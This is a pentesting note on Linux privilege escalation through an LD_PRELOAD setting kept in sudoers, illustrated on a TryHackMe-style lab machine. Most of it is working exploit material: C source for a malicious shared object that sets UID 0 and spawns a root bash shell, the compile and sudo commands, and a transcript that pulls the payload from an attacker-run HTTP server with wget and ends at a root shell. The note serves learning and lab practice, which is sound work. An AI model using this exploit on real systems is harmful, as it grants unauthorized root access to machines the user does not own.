`LD_PRELOAD` is an environment variable, which is used to load the specified shared object (`.so` file) before loading any others.
Sometimes it can be specified in the `/etc/sudoers` file, which can be listed using `sudo -l`.

#### Checking for vulnerability
###### Note: If the `sudo -l` output is available, LinPEAS will flag the `LD_PRELOAD` if vulnerable. Usually, you need to enter the `sudo -l` with a password to see. If this isn't done, LinPEAS won't flag it.
First, run `sudo -l`, and check the output. If it contains `LD_PRELOAD`, it should be vulnerable.
#### Exploitation
Because the `LD_PRELOAD` environment variable loads any shared object specified, any code in the `_init()` function of the file will be executed with the sudo permissions.
Code (filename: `exploit.c`):
```
#include <stdio.h>  
#include <stdlib.h>  
#include <sys/types.h>
void _init() {
	unsetenv("LD_PRELOAD");  
	setuid(0);   // If the user specified to run is different from Sudo, use the UID of that user.
	setgid(0);   // If the group specified to run is different from Sudo, use the GID of that user.
	system("/bin/bash -p");
	}
```
Compiling:
```
gcc -fPIC -static -shared -nostartfiles -o exploit.so exploit.c
```

This can all be done locally, as long as the architecture and operating system of the target machine and the local machine are the same.

Finally, run the exploit:
```
sudo LD_PRELOAD=./exploit.so COMMAND 
```
Note: make sure to specify the path to the `exploit.so` if it is not in the same directory as the command is being run from.

### Example
First, to check for vulnerability:
```
rick@Hijack:/tmp/test$ sudo -l
Matching Defaults entries for rick on Hijack:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User rick may run the following commands on Hijack:
    (root) /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
```
In the third line, the `env_keep+=LD_PRELOAD` exists, so it's vulnerable.
Then, to compile the code from [[#Exploitation]]:
```
┌─[root@edu-virtualbox]─[/home/edu/THM/hijack]
└──╼ #nvim exploit.c
┌─[root@edu-virtualbox]─[/home/edu/THM/hijack]
└──╼ #gcc -fPIC -static -shared -nostartfiles -o exploit.so exploit.c
exploit.c: In function ‘_init’:
exploit.c:6:3: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
    6 |   setuid(0); // If the user specified to run is different from Sudo, use the UID
      |   ^~~~~~
exploit.c:8:3: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
    8 |   setgid(0); // If the group specified to run is different from Sudo, use the
      |   ^~~~~~
┌─[root@edu-virtualbox]─[/home/edu/THM/hijack]
└──╼ #ls exploit.so
exploit.so
```
Getting the binary from the local machine to the target:
```
┌─[root@edu-virtualbox]─[/home/edu/THM/hijack]
└──╼ #python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

rick@Hijack:/tmp/test$ wget http://10.8.1.167:8000/exploit.so
--2023-10-27 11:07:26--  http://10.8.1.167:8000/exploit.so
Connecting to 10.8.1.167:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 18160 (18K) [application/octet-stream]
Saving to: ‘exploit.so’
exploit.so                                                  100%[=========================================================================================================================================>]  17.73K  --.-KB/s    in 0.03s   
2023-10-27 11:07:26 (687 KB/s) - ‘exploit.so’ saved [18160/18160]
```
Finally, to exploit:
```
rick@Hijack:/tmp/test$ sudo LD_PRELOAD=/tmp/test/exploit.so /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
$ id
uid=0(root) gid=0(root) groups=0(root)
```
